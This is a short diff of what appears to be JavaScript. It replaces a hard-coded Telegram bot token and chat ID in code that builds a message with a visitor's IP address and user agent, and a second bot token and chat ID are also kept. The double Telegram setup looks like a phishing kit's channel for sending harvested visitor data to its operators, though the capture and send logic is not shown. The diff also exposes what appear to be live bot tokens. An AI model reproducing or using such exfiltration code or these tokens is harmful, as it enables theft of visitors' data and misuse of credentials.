@@ -90,8 +90,8 @@ Client IP: ${clientIp}
 User Agent: ${userAgent}`;
 
                 // Replace these values with your bot token and chat ID
-                const botToken = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';
-                const chatId = '-1002398431021';
+                const botToken = '7923551464:AAH7uJ-GpKv3dfcjRWYbu3dAhGFIrih7hAg';
+                const chatId = '7923551464';
                 const botToken2 = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';
                 const chatId2 = '7380056237';
 
